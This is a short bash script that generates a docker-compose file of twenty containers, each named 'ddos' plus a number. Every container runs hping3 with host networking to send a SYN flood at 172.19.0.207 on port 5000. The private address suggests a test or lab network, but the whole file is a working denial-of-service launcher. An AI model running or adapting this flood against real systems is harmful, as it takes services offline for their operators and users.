#!/bin/bash
cat > docker-compose.yml <<EOF
version: "3"
services: 
$(for c in {1..20}
do
cat <<EOC
    ddos$c:
        image: sflow/hping3:latest
        network_mode: host
        stdin_open: true
        tty: true
        command: ["hping3", "172.19.0.207", "-p", "5000", "-S", "--flood"]
EOC
done
)
EOF
